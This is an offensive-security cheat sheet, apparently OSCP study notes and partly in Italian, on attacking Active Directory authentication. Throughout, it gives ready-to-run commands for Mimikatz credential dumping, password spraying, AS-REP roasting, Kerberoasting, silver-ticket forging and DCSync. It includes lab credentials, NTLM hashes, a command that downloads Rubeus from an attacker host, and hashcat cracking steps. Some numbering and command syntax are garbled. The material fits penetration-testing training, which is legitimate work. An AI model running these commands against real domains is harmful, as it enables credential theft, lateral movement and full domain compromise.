# Active Directory Authentication

## Cached AD Credentials

In modern versions of Windows, password hashes are stored in the _Local Security Authority Subsystem Service_ (LSASS) memory space. Accessing this memory space requires elevated privileges (SYSTEM or local administrator).

One way to protect against tools like _Mimikatz_ is to enable _LSA Protection.

```bash
powershell -ep bypass
.\mimikatz.exe
```

Enabling the _SeDebugPrivlege_ privilege which allows interacting with processes owned by other accounts:

```bash
privilege::debug
```

Retrieving hashes associated with users logged into the current machine:

```bash
sekurlsa::logonpasswords
```

A different way to use _Mimikatz_ is to use _TGT_ and _service tickets_. In fact, tickets are also stored inside LSSAS and therefore it is possible to use them to retrieve tickets.

Then run this command:

```bash
sekurlsa::tickets
```

# Performing Attacks on Active Directory Authentication

## Password Attacks

One of the important pieces of information to obtain before starting a brute force or wordlist-based attack is the policies linked to the specific account you want to attack. A very important piece of information, obtained by using the _net accounts_ command, is the lockout number, or the number of possible attempts before the account can be blocked:

```bash
net accounts
```

Below are 3 examples:
1) Using LDAP and ADSI to perform a _low and slow_ password attack_ against AD users.
2) _Password spraying attack_ against AD users using SMB.
3) _Password spraying attack_ based on obtaining a TGT.

4) Using _Spray-Passwords_ to extract credentials from a known password:

```bash
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass $PASSWORD -Admin
```

2) SMB Attack via _crackmapexec_ starting from a known password:

```bash
crackmapexec smb $IP_TARGET -u user_list.txt -p '$PASSWORD' -d $DOMAIN_NAME

crackmapexec smb $IP_TARGET -u user_list.txt -p '$PASSWORD' -d $DOMAIN_NAME --continue-on-success

crackmapexec smb 192.168.224.0/24 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

3) _Password spraying attack_ based on obtaining a TGT.

```bash
.\kerbrute_windows_amd64.exe passwordspray -d $DOMAIN_NAME .\user_list.txt "$PASSWORD"
```

Another useful tool could be [Kerbrute](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering):

```bash
# passwordspray
/home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc 10.10.103.152 -vvv

# enumeration
kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## AS-REP Roasting

The Kerberos authentication process is based on sending an AS-REQ and, after verification by the domain controller, receiving an AS-REP containing a session Key and a TGT. This step is called _Kerberos preauthentication_ and prevents offline password guessing.

Without this step, an attacker can send an AS-REQ request to the domain controller on behalf of any AD user. Once the AS-REP response is obtained from the domain controller, the attacker can perform an offline password attack by exploiting the decrypted part of the response. This attack is called _AS-REP Roasting_.

It is worth noting that by default, the _Do not require Kerberos preauthentication_ option is disabled for each user. If it is not, we can proceed with the attack.

There are two possibilities:
1) From kali
2) From windows machine

### From kali

Using _GetNPUsers_ to perform the attack and _hashcat_ to get the password:

```bash
# Singolo Username
impacket-GetNPUsers -dc-ip $IP_TARGET  -request -outputfile hashes.asreproast $DOMAIN_NAME/$USER_NAME

# Username multipli
impacket-GetNPUsers -dc-ip $IP_TARGET -no-pass -usersfile users.txt $DOMAIN_NAME/ 

#Esempi

# Singolo Username
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete

# Username multipli
impacket-GetNPUsers -dc-ip 10.129.95.180 -no-pass -usersfile users.txt EGOTISTICAL-BANK.LOCAL/ 

hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### From Windows

Using _Rubeus.exe_ from windows:

```bash
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .

powershell iwr -uri http://$IP_KALI:9999/windows/Ghostpack-CompiledBinaries/Rubeus.exe -Outfile Rubeus.exe

powershell -ep bypass

.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /getcredentials /show /nowrap 
```

Once you have the hash using _Rubeus_ you need to use _hashcat_ to get the password.

## Kerberoasting

If a user wants to access a resource hosted by the Service Principal Name (SPN), they must first request a ticket from the domain controller. The ticket for the service is decrypted and validated by the application server, after being encrypted using the SPN password hash

When the ticket is requested from the domain controller, no checks are made on whether the user is allowed to access the requested service. This means that if the attacker knows the target SPN, they can request a ticket for it from the domain controller.

In this case, once the ticket is received, they could try to obtain the SPN password hash and try to decrypt it, thus obtaining the password of the service account.

This attack is called _Kerberoasting_.

As before, there are two ways to perform this attack:
1) From kali
2) From windows

### From kali

Using _impacket-GetUserSPNs_ to perform the attack and _hashcat_ to get the password:

```bash
sudo impacket-GetUserSPNs -request -dc-ip $IP_TARGET $DOMAIN_NAME/$USER_NAME -outputfile hashes.kerberoast

#Esempio
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -outputfile hashes.pete

hashcat --help | grep -i "Kerberos"

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### From Windows

Using _Rubeus_ on windows to perform a _Kerberoast_ attack:

```bash
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .

powershell iwr -uri http://$IP_KALI:9999/windows/Ghostpack-CompiledBinaries/Rubeus.exe -Outfile Rubeus.exe

powershell -ep bypass

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Once you have the hash via _Rubeus_ you need to use _hashcat_ to get the password.

Alternatively, you could also use [Get-SPN.ps1](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1) (see PG machine [here](https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d)).

**Kerberoastable Users**:

```bash
Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname
```

**TargetedKerberoasting**:

When you have control of an object that has `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` on a target.

```bash
python3 /home/kali/OSCP/util/windows/targetedKerberoast/targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.208.40
```

## Silver Tickets

An important aspect of Kerberos authentication is the following: the user and group permissions in the service ticket are not verified by the application (in most cases), forcing it to blindly trust the integrity of the ticket. There is a validation option called _Privileged Account Certificate_ (PAC) that allows you to avoid this behavior, but it is not always used (Since 2022 Microsoft has created a security patch to update the PAC structure).

For example, if the attacker were able to authenticate to an IIS server running in the context of a **service account** _iis_service_, the application would determine its permissions only by the _group memberships_ present on the service ticket.

If the attacker had the password (or associated NTLM hash) of the **service account**, he could create his own ticket to access the resource (_iis_service_) with all possible permissions.

This is called a _silver ticket_ and if the SPN is used on multiple servers, this would allow access to each of them.

- Example with svc_mssql: [Proving Grounds machine - Nagoya](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f)

In general, three things are needed to create a _silver ticket_:

- **SPN password hash**
- **Domain SID**
- **Target SPN*

Again there are two ways to perform this attack:
1) From kali
2) From windows

### From kali

Using ticketer and psexec:

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 

python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### From Windows

Using _Mimikatz_ to get the NTLM hash of the user logged into the _iis_service_ service, mapped to the target SPN:

```bash
powershell -ep bypass

.\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
```

- Domain SID:

```bash
whoami /user

#oppure tramite powershell
Get-ADdomain
```

- Creating the _silver ticket_:

```bash
kerberos::golden /$SID_NUMBER /domain:$DOMAIN_NAME /ptt /target:$COMPUTER_TARGET $/service:$SERVICE_NAME /rc4:$NTLM_HASH /user:$USER_NAME

# esempio
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

- Command to show the list of Kerberos tickets to confirm that the _silver ticket_ has been created and sent to the current session:

```bash
klist
```

- Ticket injection

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
```


## 22.2.5. Domain Controller Synchronization (DCSync)

In large environments, domains rely on more than one domain controller to provide redundancy. The _Directory Replication Service_ (DRS) Remote Protocol uses _replication_ to synchronize these redundant domain controllers. A domain controller could request an update for a specific object using the _IDL_DRSGetNCChanges_ API.

Fortunately (for an attacker), the domain controller receiving an update request does not check whether the sender is a known domain controller, it only checks whether the associated SID has the correct privileges:
- _Replicate directory changes_
- _Replicate all directory changes_
- _Replicate directory changes in the filtered set_

By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these privileges assigned. So if you gain access to an account that is part of one of these three groups you can perform a _dcsync_ attack where you impersonate a domain controller, enabling the ability to request any user credentials from the domain.

Again there are two ways to perform this attack:
1) From kali
2) From windows

### From kali

Using _impacket-secretsdump_ to perform the attack and _hashcat_ to get the password:

```bash
impacket-secretsdump -just-dc-user $USER_NAME_TO_REQUEST $DOMAIN/$HIGH_PRIVILEGE_ACCOUNT:"$PASSWORD"@$TARGET_IP

# esempio
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

# crack degli hash trovati
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### From Windows

Utilizzo di _Mimikatz_ su windows per eseguire un attacco _dcsync_:

```bash
.\mimikatz.exe

lsadump::dcsync /user:$DOMAIN\$USER_NAME_TO_REQUEST

lsadump::dcsync /user:corp\dave
```

Once you have the hash using _Mimikatz_ you need to use _hashcat_ to get the password.